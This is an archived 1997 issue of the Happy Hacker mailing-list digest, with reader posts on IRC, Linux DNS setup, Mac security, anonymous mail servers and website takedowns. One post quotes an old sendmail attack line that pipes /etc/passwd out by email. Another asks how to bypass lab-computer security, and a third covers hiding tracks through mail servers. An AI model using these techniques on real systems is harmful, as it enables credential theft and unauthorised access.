@@ -1,0 +1,414 @@
+Happy Hacker Digest Feb. 14-15, 1997 
+____________________________________ 
+This is a moderated list for discussions of *legal* hacking. Moderator is 
+Carolyn Meinel. Please don't send us anything you wouldn't email to your 
+friendly neighborhood narc, OK? Send posts to . Better 
+yet, 
+To subscribe or unsubscribe, use the subscribe boxes on the menubar. If you decide you just want to 
+use the forum and not get these mailings, I promise my feelings won't get 
+hurt if you unsubscribe from this list. 
+Happy hacking! (insert clever phrase here:) 
+---------------------------------------------------------
+
+URL O' the Day: http://www3.ns.sympatico.ca/loukas.halo8 Excellent graphics, 
+great newbie hacking tips, some PG-13 language, hacker programs are offered, 
+some of which are illegal to use (like the war dialer), but overall a 
+sincere attempt at being a good guy hacker site.
+
+Table of Contents:
+
+Headline News: Get on Infowar IRC Hackers' Group!!! 
+FCC Hoax Update 
+Whois and WAIS Access for the Win95-Challenged 
+Linux Question 
+SATAN Question 
+Mac *NOT* Impregnable 
+Ode to Lynx 
+Hacker Wars 
+Handles 
+Hiding Your Tracks 
+Invitation for Open Discourse
+
+HEADLINE NEWS: GET ON INFOWAR IRC HACKERS' GROUP!!!
+
+From: k1neTiK <samk5@idt.net>
+
+ For the people that don't already know, Infowar has an IRC server up at 
+www.infowar.com port 6667 (this is the default port for IRC clients, so 
+don't worry about it.), and the main channel is #hackers .  I would really 
+like to see more people on this server, as the highest traffic so far has 
+been only eight people.  I am on IRC from around 5:10 to 6:45 EST on 
+weekdays, and erratically on Sundays, and I have a Fserv up which holds many 
+of the mailings from the Happy Hacker list starting in December, and all the 
+"Guides to (Mostly) Harmless Hacking".  If people would like me to hold more 
+than that, please send requests to: samk5@idt.net or just tell me on IRC.  I 
+will not be holding programs, as I have very little space left on my hard drive. 
+Please, Please give the server a chance!  And don't just go there, and on 
+finding out that there's no one there, just leave; stay a while!  I recommend 
+connecting via an IRC client rather than using Java to access it, because, 
+one; Java doesn't support DCC which means you can't use my Fserv, and two, 
+you have scripting capability if you use an IRC client like mIRC.  If you 
+are using mIRC, and you get on the server, and no one else is there, go to 
+room #hackers (/join #hackers) and add the following line or something 
+similar to your "Events" area of "Remote" (click on the remote icon, then 
+click the Events tab) "1: ON JOIN:#hackers:/beep 5 1" 
+without the quotation marks.  Then click "listening", click OK, then 
+minimize.  Whenever someone joins you'll hear 5 beeps with 1 second 
+intervals between them (format of beep command is /beep <number> <delay> so 
+/beep 5 1 will produce 5 beeps with one second intervals) and then you can 
+go back to your IRC program and talk to them!! 
+  Once again, the server is www.infowar.com port 6667, and you can access it 
+using Java (go to www.infowar.com, go to "Chat" and follow some links) or an 
+IRC client. 
+thank you for your patience, and Happy Hacking! 
+             /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\ 
+            |/////////////////////////////////////////////////////////| 
+            |//////////k1neTiK////////////////////////////////////////| 
+            |//E-mail:  samk5@mail.idt.net////////////////////////////| 
+            |//IRC: usually on irc.stealth.net from around 5:30 p.m.//| 
+            |///(under the handle k1neTiK, duh!)//////////////////////| 
+            |/////////////////////////////////////////////////////////| 
+             \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+
+FCC HOAX UPDATE
+
+From: "Bill Curnow" <bcurnow@Onramp.NET>
+
+On 13 Feb 97 at 12:40, Carolyn P. Meinel <> wrote:
+
+> Moderator: Please stop emailing me about how we all have to desperately 
+> email the FCC or else they may allow local phone companies to impose per 
+> minute charges on Internet access. Yes, there was some truth to the alerts 
+> you sent me. But the deadline for comments has passed. The telcos have lost.
+
+To set the record straight, the TELCOs wanted to charge ISPs per minute 
+for their use of high-speed lines.  The FCC decided _against_ the TELCOs 
+in _December, 1996_.  All the FCC was asking for was public comment. 
+They have done nothing to deserve the over 100,000 flames they've 
+received for something _they had no intention of allowing_.
+
+-- 
+Bill Curnow, Holder of Past Knowledge  O-               bcurnow@onramp.net 
+http://www.kernow.com/bcurnow/                          bcurnow@kernow.com 
+finger: bcurnow@mail.kernow.com                   PGP public key available 
+ 
+
+    Bes den heb tavas a holhas e dir. 
+    (A man who has lost his tongue has lost his land.) 
+                                 18th century Cornish proverb
+
+WHOIS AND WAIS ACCESS FOR THE WIN95-CHALLENGED
+
+From: "Intergalactic <--" <intergalactic@hotmail.com>
+
+Oh boy, do I look dumb! Awhile back I posted a message about using the Internet 
+resources (ping, traceroute, etc.) at a.cni.org. Well, somewhere between the 
+time I sent the post and the time it was posted, a.cni.org decided to 
+password-protect the inetroom account. I have sent inquiring emails, but as of 
+this date, no one has yet to reply. I apologize for the confusion I may have 
+created, but Win95 users do not fear! You can access whois and WAIS by 
+telnetting to rs.internic.org. If you are using Win95 you can still use ping 
+and traceroute! To do a ping, go to your DOS prompt while you are connected to 
+the 'net, make sure your in the WINDOWS directory and type
+
+ping (IP address)
+
+To use traceroute, get to your DOS prompt while connected to the 'net, make 
+sure your in the C:/WINDOWS directory and type
+
+tracert (IP address)
+
+Again, sorry about the confusion! You know, it's sad but true, with all that 
+pointing-and-clicking, most people using Win95 never realize what a computer can 
+really do.
+
+--------------------------------------------------------- 
+Get Your *Web-Based* Free Email at http://www.hotmail.com 
+---------------------------------------------------------
+
+LINUX QUESTION
+
+X-Sender: "Mike Coloney" <ctone2@peachlink.com>
+
+>from: Brandon Tennant <Brandon_tennant@bc.sympatico.ca> 
+>Subject: Yet another LINUX ? 
+> 
+> Hello again, 
+>                  well I finally figured out the illusive PPP with Linux. 
+>so what did id do once I logged on to my ISP through LINUX for the first 
+>time? Well I think to myself  "I'll go play on my favorite New Mexican 
+>Computer GRANDE!!" well of course like everything new in Linux it barked 
+>at me "Invalid Host Name" so I eventually figure out !!! wow I have to 
+>punch in the d*** DNS instead of the host NAME! well this brings me to 
+>my obvious question... HOW do I configure Finger , Telnet , Lynx etc.. 
+>to use Names instead of DNS #? 
+>
+
+Sorry guys, I guessed I messed something up the first time I sent this so 
+Carolyn 
+thought I wrote the above or something, but this is what I wanted to post:
+
+I get that same problem except mine looks like this:
+
+blah~$ telnet foo.bar 
+Host name lookup failure 
+blah~$
+
+I asked on EfNet in #linux and everyone screams, 'Your /etc/resolv.conf file!' 
+Mine is right, but you may want to check yours.  I have setup my resolv.conf 
+file and my /etc/ppp/pap-secrets file (my ISP uses NT (ack!) and PAP 
+(Password Authentication Protocol).  I know how to use pppd with PAP so I can 
+get on the Internet, just have to use the full IP when telneting.. etc. 
+Have I missed some setup file or something?  /etc/inetd.conf , is there 
+something in there I've missed?  Any help would be appreciated.
+
+Thank you. 
+I hope that I've been of some help and hope someone would help me.
+
+SATAN QUESTION
+
+Anonymise the following request for information, please...
+
+I've recently come across a textfile written by the creators of SATAN that 
+outlines many weaknesses in the typical UNIX machine.  One of the attacks 
+detailed by the writers involves a user wishing to gain the passwd file of a 
+remote host.  It went something like this:
+
+user telnets to port 25 of remote host. 
+user inputs line: 
+Mail from: "|/bin/mail users@mailaddress.net < /etc/passwd"
+
+user then inputs line: 
+rcpt to: nosuchuser
+
+and proceeds to quit the mail program since the data part of this process is 
+irrelevant. 
+If the user lucks out, the remote host's passwd file is then mailed to him. 
+What I'm curious about is the complete lack of anonymity here.  Unless one 
+had set up an account (or two or six) with a system much like old 
+anon.penet.fi, one is technically screwed, yes?  I assume that system logs 
+would show both the creation of this piece of mail and it's subsequent 
+remailing back to the user in question, both of which have that user's email 
+address all over them.  On the legal side of things, am I correct in 
+assuming that the user is in no way liable until he cracks and makes use of 
+passwords from the passwd file?
+
+MAC *NOT* IMPREGNABLE
+
+From: TQDB <tqdb@feist.com>
+
+> I will tell you all now, don't waste your time. Although they have 
+> made this server a Public Domain and given the proper legal disclaimers to 
+> the authorities on placed them on their sites, this site (I'm 99% sure) CAN 
+> NOT be hacked into. "What?" you say. Bronc Buster saying a site is 
+> UNhackable? Well this site in running on a MAC.
+
+    Whooptee.  People basically said the same thing about Windows NT in 
+the beginning.  "There isn't any shell access, how can we hack it?!!" 
+Guess what, you don't need shell access to hack a server.  And that 
+includes Macs.
+
+> I'm not a Mac lover by any means, BUT their Web Servers are the most secure 
+> on the net today and I'd put one of them up against a Unix system any day. 
+> So go back to school, or work and forget about this 10,000 whatevers (it's 
+> Swedish money) because I bet they don't even have it. If someone does hack 
+> it, I'll eat a bug.......
+
+    Without trying to start any OS wars, I think it is safe to claim that 
+most technical people move on to other OSes rather than stick with MacOS 
+and due to this there is a lack of real Mac hackers.  Give people a few 
+months, when the become bored with Unix, WinNT and Novell and you'll 
+start hearing about some more Mac exploits. 
+ 
+
+  -=| T.Q.D.B. - tqdb@wichita.fn.net - http://www.feist.com/~tqdb |=- 
+  
+           "The term 'hacker' is not necessarily derogatory. 
+          A small percentage of them give the rest a bad name." 
+       --Special Agent Andrew Black, FBI SF Computer Crime Squad
+
+Moderator: Yeah, but now Mac OS is dying, dying, gone... How many Amiga 
+hackers are there out there? On the other hand, now Apple is going to use a 
+new, improved version of the NeXt flavor of Unix. NeXt boxes are notoriously 
+hackable!
+
+From: Tuna Man or BrainMaster <fifo@concentric.net>
+
+Please feel free to flame me if you wish.. 
+Does anyone have any information on bypassing the FOOLPROOF Mac security 
+software? Strangely one of the 20 MACS in my school's lab was foolproof 
+protected but it allowed me to delete and drag as I wish.  So I copied its 
+preferences onto a disk and deleted its INIT ..therefore, I guess disabling it? 
+anyway I have the disk but can't figure it out at home because of my PC..I'm 
+only a freshman in H.s. and not a wannabe pleeze!..so I guess the worst 
+thing they can do is kick me out of programming.  But if you have any 
+information I would be thankful! I am not going to destroy the system.  I 
+just want access. 
+-BrainMaster 
+-the world at your fingertips 
+ 
+
+ODE TO LYNX
+
+From: Frankie Hayes <strider@unix.aardvarkol.com>
+
+Hey again, 
+ I'm not sure if this is the right place to ask this, but what the h*** ;) 
+I'm puttin up a TEXT-ONLY web page, and I'd like a good hit counter for 
+it....I don't want one of the graphic one's, just one that *I* can see 
+with Lynx. Well, lemme know what ya'll think.....
+
+        Strider
+
+HACKER WARS
+
+From: Frankie Hayes <strider@unix.aardvarkol.com>
+
+Hey Carolyn, 
+ I'm sorry I can't quote very well on PINE (I hate it!! But it's all my 
+ISP has) but I'm referring to your comment on hacker wars... 
+ First, I really don't care for the idea of hacker wars, but if whatever 
+it was is bad enough, I'd be *HAPPY* to screw some "bad guys" 
+over....anyway, just thought I'd put my 2cents in.
+
+HANDLES
+
+From: thelord@godsplace.org
+
+Pick something that has nothing to do with a book.  Pick something that 
+no one would ever think of using as a handle.  If you use something from 
+books, especially well-read ones, you're almost guaranteed someone else 
+will use it too.
+
+-- 
+"We have enough youth, how about a Fountain of Smart?"
+
+HIDING YOUR TRACKS
+
+From: k1neTiK <samk5@idt.net>
+
+Bronc Buster posted some info on checking anonymous servers and catching 
+mail bombers, and I would like to elaborate and correct some info.  First of 
+all, I want to make it clear that when someone says "anonymous server" they 
+are not talking about something like what "anon.penet.fi" used to be, where 
+you could send Email anonymously, rather, they mean a server which has an 
+old enough version of Sendmail or any SMTP program that will not reveal much 
+info about you in the header.  Second of all, the only thing Identd tells 
+the mail server is your username (if it says "received from blah.com 
+(samk5@ppp-48.ts-10.nyc.idt.net)" it found out the "samk5" part from 
+Identd), third of all, if you are not running an Ident Daemon on your 
+computer, Sendmail cannot use Identd to find out your Username, rather, 
+first it checks to see if you have Identd running and if you don't, it makes 
+a query somewhere (I forget the specifics) and finds it out that way.  Also, 
+in regard to mIRC, in order for Bronc Busters technique to work, you must 
+first turn "Show Identd requests" on in your options menu (at least I think 
+it's in the options menu, look around).  Lastly, there is a much easier way 
+to find out if a mail server is anonymous by just typing in "helo 
+whatever.com" and seeing if it echoes "hello whatever.com" if it says "hello 
+ppp-21.ts-8.nyc.idt.net" or something like that, or even worse, says "hello 
+samk5@ppp-21.ts-8.nyc.idt.net" it is not anonymous.
+
+>I was wondering how the heck can I attach a file if I telnet to a port on a 
+>distant computer to send e-mail.
+
+  In order to understand the answer you have to understand how "attach file" 
+works.  Attach file works by UUencoding or MIME encoding a file into plain 
+text so it can be sent in an ordinary message, sending it to someone, and 
+then having their mail program decode it for them.  You will need a 
+UUencoding or MIME encoding program, encode the file, then copy and paste 
+the file content into the message. 
+             /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\ 
+            |/////////////////////////////////////////////////////////| 
+            |//////////k1neTiK////////////////////////////////////////| 
+            |//E-mail:  samk5@mail.idt.net////////////////////////////| 
+            |//IRC: usually on irc.stealth.net from around 5:30 p.m.//| 
+            |///(under the handle k1neTiK, duh!)//////////////////////| 
+            |/////////////////////////////////////////////////////////| 
+             \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+
+INVITATION FOR OPEN DISCOURSE
+
+X-Sender: mulder@ntplx.net
+
+ ( a note: this letter is not meant as a flame but rather an invitation for 
+open discourse. You can reply to me personally at mulder@ntplx.net, or to 
+this list, but anything above a calm, rational conversation will be ignored 
+for the ranting that it is. thank you.)
+
+>  If you want to take down a site that is legal, 
+>however, I recommend advising the owner of the Web server of its existence 
+>and urging him or her to remove it. This is tremendously effective if in 
+>fact the Web site is seriously bad news. If this doesn't work, contact the 
+>company that provides Internet connectivity for that Web server.  And so on 
+>up the line.
+
+dear Ms. Meinel and the rest of this list:
+
+        I'm a huge fan of you, what you do, and this list in general. I 
+find it informative and fun to be a member of. So thank you.
+
+        However, the above, and a number of other posts regarding the 
+process of "nuking offensive web sites" disturbs me for a number of 
+reasons. 
+        Assuming the subject matter is NOT illegal (meaning I am not 
+sticking up for kiddie porn and would appreciate not getting labeled a 
+pervert for the rest of my life), just what gives you, me, or any other 
+person, the right to decide what is suitable for  publishment on the 
+Internet or not? If I see a site that I personally find distasteful, it no 
+more gives me the right to persecute it and attempt to get it removed than 
+it gives a nazi the right to attempt to destroy a Jewish homepage. the fact 
+that nearly anyone with a computer now has a virtual printing press with 
+which they can express themselves to a large group of people is perhaps the 
+single greatest step towards true openness in society in the last hundred 
+years. Implying that one's sense of what is "right" or "bad news" is any 
+greater than someone else's, even if that person is what you consider evil, 
+stupid, or vile, is a very definite step in the right direction.
+
+        to truly weed out what you feel is wrong, education and not 
+"nuking" is necessary.
+
+thank you for your time,
+
+--daniel barrett 
++++++++++++++++ 
+KADATH
+
+mulder@ntplx.net
+
+spoken of in whispers, seen through dreams.
+
+the most merciful thing, I think, is the inability of the human mind to 
+correlate all it's contents. 
++++++++++++++++
+
+Moderator: I have never advocated vandalism of Web sites. I believe in 
+social pressure, including our right to not only beg "pretty please," but 
+also insist that we all have the right to urge others -- yes, even the 
+owners of ISPs! --  to refuse to help the people whom we oppose.
+
+In fact, I also believe it is morally acceptable to organize letter writing 
+campaigns, to strike, picket, demonstrate, and boycott.  Those were the 
+peaceful tactics of  the Civil Rights movement for which we honor Martin 
+Luther King.
+
+Bottom line: if people want to dispense ugly weapon type programs -- newbie 
+bait available at a mouse click -- I'm for keeping the dispensers of these 
+programs on the run using any of these protest techniques.
+
+If any of you have read the book _Great Mambo Chicken & the Transhuman 
+Condition: Science Slightly over the Edge_ (Ed Regis, Addison Wesley, 1990, 
+paperback) you already know that one of my hobbies is recreational 
+explosives. If I wanted to build up my ego in a sick way, I could start 
+putting out "Guides to (mostly) Harmless Explosives." I could set up a mail 
+order service where with the click of a mouse people could order the 
+materials that go into my favorite explosives exploits.  Heck, I could set 
+up a place in a foreign country such as Zaire where laws are nonexistent and 
+sell complete packaged explosives exploits. It is really, really phun to do 
+stuph that gets the fire department, police and news media converging on you 
+only to discover they can't bust you because there isn't even a trace left 
+(e.g. zinc dust and s***** or potassium tri****** or a pot of molten zinc 
+poured on *********!), muhahaha. Super for little kids' birthday parties.
+
+But this kind of stuff takes face-to-face mentoring. Someone would probably 
+get killed by messing up my recipes. I would deserve to, at the very least, 
+get my GTMHHs hounded to the darkest corners of the Internet. 
